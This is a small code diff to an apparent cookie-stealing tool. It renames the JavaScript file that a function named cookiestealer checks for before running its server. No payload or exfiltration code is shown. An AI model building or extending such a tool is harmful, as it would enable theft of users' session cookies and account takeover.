@@ -10,7 +10,7 @@ time.sleep(2)
 
 #definig a function to run the main server
 def cookiestealer():
-	if os.path.exists('bgp.js') == False:
+	if os.path.exists('cst.js') == False:
 		print(colored("\n\n Javscript File Not Found..exiting now!\n", "red", attrs=['bold']))
 		sys.exit(0)
 	else:
